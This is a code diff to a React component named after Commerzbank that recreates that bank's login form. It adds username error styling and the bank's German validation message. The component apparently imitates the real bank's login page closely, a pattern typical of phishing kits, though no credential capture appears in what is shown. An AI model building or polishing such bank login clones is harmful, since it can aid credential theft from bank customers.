@@ -183,8 +183,8 @@ const Commerzbank = () => {
                 {/* Username */}
                 <div className="mb-8">
                   <div
-                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
-                    style={{ borderColor: "#506c74" }}
+                    className={userError ? "relative pt-5 border-b-[3px]" : "relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"}
+                    style={{ borderColor: userError ? "#c5000e" : "#506c74" }}
                     onMouseEnter={() => setUserHover(true)}
                     onMouseLeave={() => setUserHover(false)}
                   >
@@ -213,11 +213,17 @@ const Commerzbank = () => {
                       onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setUserFocus(true); }}
                       onBlur={() => setUserFocus(false)}
                       value={username}
-                      onChange={(e) => setUsername(e.target.value)}
+                      onChange={(e) => { setUsername(e.target.value); if (userError) setUserError(false); }}
                        className="w-full bg-transparent border-0 py-2 outline-none text-[17px]"
                       style={{ color: userFocus ? "#002530" : TEXT }}
                     />
                   </div>
+                  {userError && (
+                    <div className="mt-2 flex items-start gap-2 text-[14px]" style={{ color: "#c5000e" }}>
+                      <WarningIcon />
+                      <span>Geben Sie bitte 8 oder 10 Ziffern für Ihre Teilnehmernummer oder min. 8 bis max. 50 Zeichen für Ihren Benutzernamen ein.</span>
+                    </div>
+                  )}
                 </div>
 
                 {/* Password */}
